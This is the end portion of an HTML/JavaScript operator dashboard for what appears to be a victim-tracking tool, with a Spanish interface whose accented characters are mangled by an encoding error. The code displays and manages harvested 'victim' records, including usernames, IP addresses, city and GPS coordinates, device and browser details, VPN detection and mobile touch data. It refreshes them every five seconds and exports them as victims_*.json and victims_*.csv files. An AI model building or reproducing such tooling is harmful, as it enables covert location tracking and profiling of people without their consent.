                                <div class="detail-value">${victim.timezoneInfo.timezone || 'N/A'}</div>
                            </div>
                            <div class="detail-item">
                                <div class="detail-label">Offset</div>
                                <div class="detail-value">${victim.timezoneInfo.offset || 'N/A'} min</div>
                            </div>
                            <div class="detail-item">
                                <div class="detail-label">Locale</div>
                                <div class="detail-value">${victim.timezoneInfo.locale || 'N/A'}</div>
                            </div>
                        </div>
                    </div>
                `;
            }

            html += '</div>';
            return html;
        }

        function getTimeAgo(date) {
            const seconds = Math.floor((new Date() - date) / 1000);
            if (seconds < 60) return 'Hace ' + seconds + ' seg';
            if (seconds < 3600) return 'Hace ' + Math.floor(seconds / 60) + ' min';
            if (seconds < 86400) return 'Hace ' + Math.floor(seconds / 3600) + ' hrs';
            return 'Hace ' + Math.floor(seconds / 86400) + ' d√≠as';
        }

        async function migrateData() {
            if (confirm('¬øQuieres actualizar todos los registros antiguos con los nuevos campos?\n\nEsto agregar√°:\n- Detecci√≥n de VPN mejorada\n- Tipo de dispositivo\n- Datos t√°ctiles m√≥viles\n- Fuente de ubicaci√≥n')) {
                try {
                    const button = event.target;
                    button.disabled = true;
                    button.textContent = '‚è≥ Migrando...';

                    const response = await fetch('/api/migrate', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' }
                    });

                    const result = await response.json();

                    if (result.success) {
                        alert(`‚úÖ Migraci√≥n completada!\n\nTotal: ${result.totalRecords}\nActualizados: ${result.updated}\nSin cambios: ${result.unchanged}\nErrores: ${result.errors}`);
                        loadData();
                    } else {
                        alert('‚ùå Error en migraci√≥n: ' + result.error);
                    }

                    button.disabled = false;
                    button.textContent = 'üîß Migrar Datos Antiguos';
                } catch (error) {
                    alert('‚ùå Error al migrar datos: ' + error.message);
                    event.target.disabled = false;
                    event.target.textContent = 'üîß Migrar Datos Antiguos';
                }
            }
        }

        async function clearData() {
            if (confirm('¬øSeguro que quieres eliminar TODOS los datos?')) {
                try {
                    await fetch('/api/clear', { method: 'DELETE' });
                    alert('‚úÖ Datos eliminados');
                    loadData();
                } catch (error) {
                    alert('‚ùå Error al eliminar datos');
                }
            }
        }

        async function exportData() {
            try {
                const dataStr = JSON.stringify(victimsData, null, 2);
                const dataBlob = new Blob([dataStr], { type: 'application/json' });

                const url = URL.createObjectURL(dataBlob);
                const link = document.createElement('a');
                link.href = url;
                link.download = `victims_${new Date().toISOString()}.json`;
                link.click();
                URL.revokeObjectURL(url);
            } catch (error) {
                alert('‚ùå Error al exportar');
            }
        }

        async function exportCSV() {
            try {
                let csv = 'Timestamp,Username,IP,Country,City,Latitude,Longitude,Device,OS,Browser\n';
                victimsData.forEach(v => {
                    const lat = v.geolocation?.latitude || '';
                    const lon = v.geolocation?.longitude || '';
                    csv += `"${v.timestamp}","${v.username || 'N/A'}","${v.network?.ip || ''}","${v.network?.country || ''}","${v.network?.city || ''}","${lat}","${lon}","${v.device?.type || ''}","${v.os?.name || ''}","${v.browser?.name || ''}"\n`;
                });

                const blob = new Blob([csv], { type: 'text/csv' });
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = `victims_${new Date().toISOString()}.csv`;
                link.click();
                URL.revokeObjectURL(url);
            } catch (error) {
                alert('‚ùå Error al exportar CSV');
            }
        }

        // Inicializar
        initMap();
        initCharts();
        loadData();

        // Auto-refresh cada 5 segundos
        setInterval(loadData, 5000);
    </script>
</body>
</html>
